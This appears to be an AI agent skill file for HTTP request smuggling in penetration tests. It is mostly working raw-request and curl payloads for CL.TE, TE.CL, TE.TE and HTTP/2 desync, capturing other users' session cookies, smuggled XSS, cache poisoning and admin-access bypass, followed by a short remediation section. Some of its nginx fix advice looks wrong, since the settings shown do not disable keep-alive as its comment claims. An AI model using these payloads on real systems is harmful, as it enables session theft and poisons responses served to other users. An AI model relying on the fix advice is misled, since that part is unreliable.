---
id: http-request-smuggling
name: http-request-smuggling
description: >
  HTTP request smuggling specialist for authorized penetration tests. Covers CL.TE and
  TE.CL variants, detection via timeout and differential responses, TE.TE obfuscation,
  h2.CL and h2.TE HTTP/2 downgrade attacks, exploitation for bypassing front-end auth,
  Burp HTTP Request Smuggler extension usage, and remediation. Triggers on: HTTP request
  smuggling, CL.TE, TE.CL, TE.TE, h2.CL, h2.TE, desync attack, HTTP desync,
  request tunneling, HTTP/2 downgrade smuggling.
triggers:
  - HTTP request smuggling
  - CL.TE
  - TE.CL
  - TE.TE obfuscation
  - h2.CL
  - h2.TE
  - desync attack
  - HTTP desync
  - request tunneling
  - HTTP/2 downgrade
  - front-end security bypass
  - smuggling exploit
---

# HTTP Request Smuggling

## Authorization Gate

STOP. Request smuggling attacks affect ALL users on the target infrastructure.
A misfire can corrupt other users' responses or cause application errors visible
in production. Always confirm written authorization and use with extreme care.

---

## 1. Understanding HTTP Request Smuggling

HTTP request smuggling occurs when a front-end proxy (load balancer, CDN, WAF) and
back-end server disagree on where one HTTP request ends and the next begins. This
disagreement allows an attacker to "smuggle" a hidden prefix onto the next user's request.

### 1.1 Why It Happens

```
Front-end:  nginx, HAProxy, Cloudflare, AWS ALB, F5
Back-end:   Apache, Node.js, IIS, Tomcat

RFC 7230: If both CL and TE headers present, TE takes precedence.
But many implementations handle this differently:

CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
TE.TE: Both use Transfer-Encoding but one can be tricked into ignoring it
h2.CL: HTTP/2 front-end → HTTP/1.1 back-end, CL injected into h2 header
h2.TE: HTTP/2 front-end → HTTP/1.1 back-end, TE injected into h2 header
```

### 1.2 Impact Chain

```
1. Bypass front-end access controls (WAF, auth headers, IP allowlists)
2. Capture other users' requests (including cookies, tokens, POST bodies)
3. Reflected XSS via smuggled response poisoning
4. Web cache poisoning via smuggled responses
5. Request tunneling — access internal services via back-end connection
```

---

## 2. Detection — Automated

### 2.1 Burp HTTP Request Smuggler Extension

```
1. Install: Extender → BApp Store → "HTTP Request Smuggler" → Install
2. Right-click a request to the target in Proxy History
3. Extensions → HTTP Request Smuggler → Smuggle probe (passive)
   OR
   Extensions → HTTP Request Smuggler → Smuggle attack (active — sends malformed requests)
4. Let it run 30-60 seconds
5. Check Scanner tab for findings:
   - CL.TE desync
   - TE.CL desync
   - HTTP/2 TE injection
   - HTTP/2 CL injection
6. Any finding marked "Confirmed" via timing or differential response is a real hit
```

### 2.2 Nuclei Detection

```bash
nuclei -u https://TARGET \
  -t http/request-smuggling/ \
  -o nuclei-smuggling.txt \
  -stats

# H2C smuggling check
nuclei -u https://TARGET \
  -t http/vulnerabilities/generic/http-request-smuggling.yaml
```

---

## 3. CL.TE — Manual Detection and Exploitation

### 3.1 Detection via Timing (Safe Probe)

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X

Explanation:
- Front-end reads CL=4, forwards exactly 4 bytes body ("1\r\nA\r\n") — ignores X
- Back-end reads TE chunked: "1\r\nA\r\n" = chunk of 1 byte (A), then expects next chunk
- "X" is left hanging in the back-end buffer — causes timeout (~30s)
- If response delays ~30s → CL.TE confirmed
```

```bash
# Time the request — >10s delay = potential CL.TE
time curl -s -X POST "https://TARGET/" \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data $'1\r\nA\r\nX'
```

### 3.2 Differential Response Confirmation

```
# Request 1 (attacker — smuggles G prefix):
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

# Request 2 (innocent request — victim or attacker's second request):
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

Normal=body

# If Request 2 returns 400/404 with response mentioning "GPOST" or "Unrecognized method G"
# → CL.TE confirmed (the G was prepended to the second request's method)
```

### 3.3 CL.TE Exploitation — Bypass Front-End Access Control

```
# Target: /admin is blocked by front-end WAF/proxy
# The back-end allows /admin if request comes from internal

# Smuggled request that accesses /admin:
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

# The "0\r\n\r\n" ends the chunked body (back-end sees end of first request)
# "GET /admin..." is prepended to the next request to back-end
# Back-end sees this as coming from internal (front-end already handled routing)
```

---

## 4. TE.CL — Manual Detection and Exploitation

### 4.1 Detection via Timing

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

6
ATTACK
0

Explanation:
- Front-end reads TE chunked: chunk of 6 bytes (ATTACK), then terminator (0\r\n\r\n) — sends all
- Back-end reads CL=3, reads only 3 bytes ("6\r\n"), leaves "ATTACK\r\n0\r\n\r\n" in buffer
- Remaining bytes poison the next back-end connection read → timeout or confusion
- If request times out → TE.CL confirmed
```

### 4.2 TE.CL Exploitation — Front-End Bypass

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


Explanation:
- Front-end (TE): forwards whole chunked body including /admin request
- Back-end (CL=4): reads 4 bytes, leaves the GET /admin... in buffer
- Next request processed by back-end has GET /admin prepended
- Back-end sees request originating from front-end connection → may bypass auth
```

---

## 5. TE.TE — Transfer-Encoding Obfuscation

### 5.1 Concept

```
Both front-end and back-end nominally support Transfer-Encoding: chunked
But one can be tricked into ignoring the TE header via obfuscation → becomes CL.TE or TE.CL

Common obfuscation techniques:
Transfer-Encoding: xchunked
Transfer-Encoding: chunked, dechunked
Transfer-Encoding:  chunked          (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x                 (duplicate TE headers)
X-Content-Type-Options: nosniff
Transfer-Encoding: CHUNKED           (uppercase)
Transfer-Encoding: chunkedx          (invalid value — some servers ignore)
Transfer-Encoding:
	chunked                            (tab-prefixed second line)
```

### 5.2 TE.TE Detection

```bash
# Test each obfuscation variant — look for timing difference
declare -a te_variants=(
  "Transfer-Encoding: xchunked"
  "Transfer-Encoding: chunked, dechunked"
  "Transfer-Encoding: CHUNKED"
  "Transfer-Encoding: chunkedx"
  "Transfer-Encoding: x"
)

for te in "${te_variants[@]}"; do
  echo "Testing: $te"
  time curl -s -X POST "https://TARGET/" \
    -H "Content-Length: 4" \
    -H "$te" \
    --data $'1\r\nA\r\nX' 2>&1 | tail -1
done
```

---

## 6. HTTP/2 Request Smuggling (h2.CL and h2.TE)

### 6.1 Why HTTP/2 Enables New Smuggling

```
HTTP/2 uses binary framing — no ambiguity in request boundaries in HTTP/2 itself.
BUT: many front-ends accept HTTP/2 and translate to HTTP/1.1 for back-end.
If the front-end blindly passes HTTP/2 pseudo-headers as HTTP/1.1 headers,
an attacker can inject Content-Length or Transfer-Encoding into the HTTP/2 request
that gets forwarded as a real HTTP/1.1 header → desync with back-end.
```

### 6.2 h2.CL — HTTP/2 Content-Length Injection

```
# In Burp: Switch request to HTTP/2 (right-click → HTTP/2)
# Add a Content-Length header with a value smaller than the actual body

:method POST
:path /
:authority TARGET
content-type application/x-www-form-urlencoded
content-length 0          ← INJECTED — tells back-end body is 0 bytes

GET /admin HTTP/1.1
Host: TARGET
X-Ignore: x

# Front-end (HTTP/2): sees full body, forwards to back-end
# Back-end (HTTP/1.1): Content-Length: 0 → reads 0 bytes, rest queues as next request
# "GET /admin" becomes prefix of next victim's request
```

### 6.3 h2.TE — HTTP/2 Transfer-Encoding Injection

```
# HTTP/2 forbids Transfer-Encoding header (RFC 9113)
# But some front-ends forward it anyway when downgrading to HTTP/1.1

# In Burp HTTP/2 mode — add as custom header:
transfer-encoding: chunked

# Body becomes chunked:
:method POST
:path /
transfer-encoding: chunked      ← forbidden in h2 but forwarded by some front-ends

0

GET /admin HTTP/1.1
Host: internal-admin
```

### 6.4 HTTP/2 Request Tunneling

```
# If front-end uses one HTTP/2 connection per client (no multiplexing to back-end):
# Inject a second request inside the HTTP/2 request body that gets passed to back-end

# In Burp HTTP/2 mode:
POST / HTTP/2
Content-Length: 0

HEAD /admin HTTP/1.1
Host: TARGET

# Back-end processes HEAD /admin if it naively reads the continuation
```

---

## 7. Exploitation — Capturing Other Users' Requests

### 7.1 Request Capture via Smuggled Storage Endpoint

```
# Scenario: Target has a comment/post endpoint that stores body content
# Smuggle a request that captures the next user's full request into a stored comment

POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: TARGET
Cookie: session=ATTACKER_SESSION
Content-Type: application/x-www-form-urlencoded
Content-Length: 800          ← Large enough to capture victim's request

csrf=ATTACKER_CSRF&postId=5&name=Attacker&comment=

# The next victim's request is appended to "comment=" field
# Read the stored comment → contains victim's Cookie header → session hijack
```

### 7.2 Reflected XSS via Smuggling

```
# If front-end reflects a path in an error response:
# Smuggle a request with an XSS payload in the path

POST / HTTP/1.1
Host: TARGET
Content-Length: 67
Transfer-Encoding: chunked

0

GET /<script>alert(1)</script> HTTP/1.1
X-Ignore: x
```

---

## 8. WAF/Front-End Auth Bypass

### 8.1 Access Admin Panel via Smuggling

```
# WAF blocks direct access to /admin
# Smuggle a request where the back-end sees it as coming from internal:

POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
X-Forwarded-For: 127.0.0.1
X-Admin-Auth: internal-secret
Content-Length: 10

x=1
```

### 8.2 Bypass IP Allowlist for Sensitive Endpoints

```
# Back-end only allows /api/internal from specific IP
# Smuggle request with spoofed X-Forwarded-For that bypasses front-end IP check

POST / HTTP/1.1
Host: TARGET
Content-Length: 120
Transfer-Encoding: chunked

0

GET /api/internal/users HTTP/1.1
Host: TARGET
X-Forwarded-For: 10.0.0.1
X-Original-IP: 127.0.0.1
```

---

## 9. Web Cache Poisoning via Smuggling

```
# Step 1: Smuggle a request that poisons the cache with attacker content
# Step 2: Other users receive the poisoned cached response

POST / HTTP/1.1
Host: TARGET
Content-Length: 150
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
Host: TARGET
X-Injected: </script><script>alert(document.cookie)</script>
Content-Length: 10

x=1

# If /static/js/app.js is cached, and the back-end reflects X-Injected in the response,
# the cached response with XSS payload is served to all users requesting app.js
```

---

## 10. Differential Response Testing Methodology

```
Step 1: Detect — timing probe (CL.TE or TE.CL)
Step 2: Confirm — differential response (method-not-allowed on smuggled G prefix)
Step 3: Exploit — choose based on vulnerability type:
  - Auth bypass: smuggle request to protected endpoint
  - Request capture: smuggle to storage endpoint with large Content-Length
  - XSS: smuggle XSS path in a reflected error
  - Cache poison: smuggle response-altering headers

Safe testing rule:
- Use unique strings in smuggled prefixes to identify your own responses
- Never use "live" exploit payloads during detection phase
- Limit to 2-3 confirmations to avoid disrupting real traffic
```

---

## 11. Remediation

| Vulnerability | Detection Signal | Fix |
|---|---|---|
| CL.TE | Timing: back-end hangs on incomplete chunk | Normalize to one interpretation; back-end reject both CL+TE |
| TE.CL | Timing: back-end leaves data in buffer | Front-end rejects requests with both CL and TE |
| TE.TE | Obfuscated TE header accepted by one end | Reject any non-standard TE header value |
| h2.CL | HTTP/2 → HTTP/1.1 downgrade with CL injection | Front-end must strip CL header from HTTP/2 requests before forwarding |
| h2.TE | HTTP/2 TE header forwarded | RFC 9113 compliance — reject TE in HTTP/2, strip before forwarding |
| Request tunneling | Single-use HTTP/2 connection per client | Use separate back-end connections per front-end client |

```nginx
# Nginx fix — disable HTTP/1.1 keep-alive to back-end (prevents connection reuse smuggling)
proxy_http_version 1.1;
proxy_set_header Connection "";

# Also normalize Transfer-Encoding and Content-Length:
proxy_set_header Transfer-Encoding "";
```

```
HAProxy fix — normalize headers (haproxy 2.2+):
option http-no-delay
option forwardfor
# HAProxy 2.2+ normalizes CL+TE by default when both present
```

---

## Related Skills

- `burp-extension-toolkit` — HTTP Request Smuggler extension setup
- `waf-bypass-techniques` — combining smuggling with WAF bypass
- `race-condition` — timing-based attacks on concurrent requests
- `ssrf-specialist` — using smuggling to reach internal services
